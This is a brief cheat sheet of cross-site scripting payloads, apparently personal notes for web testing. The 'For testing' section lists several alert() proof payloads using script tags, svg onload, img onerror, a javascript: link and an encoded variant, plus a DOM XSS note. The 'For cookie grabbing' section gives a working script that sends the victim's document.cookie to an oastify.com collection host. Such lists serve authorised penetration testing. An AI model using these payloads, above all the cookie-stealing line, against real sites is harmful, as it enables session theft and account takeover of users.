#### For testing.
```js
<script>alert(1337)</script>
<svg/ onload=alert(1337)//
">cyborg71<script>alert(1337)</script> >> DOM XSS in document.write sink using source location.search
<script onclick="alert(1)">
<img src=x onerror=alert('XSS')>
<a href="javascript:alert('XSS')">Click me</a>
xss&lt;script&gt;alert&#40;1337&#41;&lt;&#47;script&gt;
```
#### For cookie grabbing.
```js
<script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
```
